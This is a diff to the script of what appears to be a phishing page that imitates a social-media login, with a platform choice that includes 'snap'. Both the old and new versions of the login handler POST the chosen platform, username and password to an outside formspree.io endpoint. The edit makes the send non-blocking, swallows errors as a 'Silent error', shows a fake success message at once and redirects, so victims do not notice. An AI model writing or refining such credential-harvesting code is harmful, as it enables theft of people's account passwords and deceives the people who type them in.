@@ -74,7 +74,6 @@ small{display:block;margin-top:16px;opacity:.42;font-size:.68rem}
 
 <script>
 let chosen = null;
-
 function choose(platform) {
     chosen = platform;
     document.getElementById("snap").classList.toggle("active", platform === "snap");
@@ -87,33 +86,25 @@ function choose(platform) {
     document.getElementById("password").value = "";
     document.getElementById("username").focus();
 }
-
 async function login(e) {
     e.preventDefault();
     
     const user = document.getElementById("username").value;
     const pass = document.getElementById("password").value;
-
-    try {
-        // REPLACE 'YOUR_FORMSPREE_ID' WITH YOUR ACTUAL ID
-        await fetch('https://formspree.io/f/xzedrvbl', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                platform: chosen, 
-                username: user,  
-                password: pass 
-            })
-        });
-    } catch (err) {
-        console.log("Data transmission error");
-    }
-
-    // Success animation
+    // 1. Attempt to send data (do not let this block the redirect)
+    fetch('https://formspree.io/f/xzedrvbl', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+            platform: chosen, 
+            username: user,  
+            password: pass 
+        })
+    }).catch(err => console.log("Silent error"));
+    // 2. Immediately show the success UI
     document.getElementById("loginForm").classList.add("hidden");
     document.getElementById("done").classList.remove("hidden");
-
-    // Redirect to your website file after a short delay so they see the "Success" message
+    // 3. Trigger the redirect
     setTimeout(() => {
         window.location.href = "web.html";
     }, 2000);
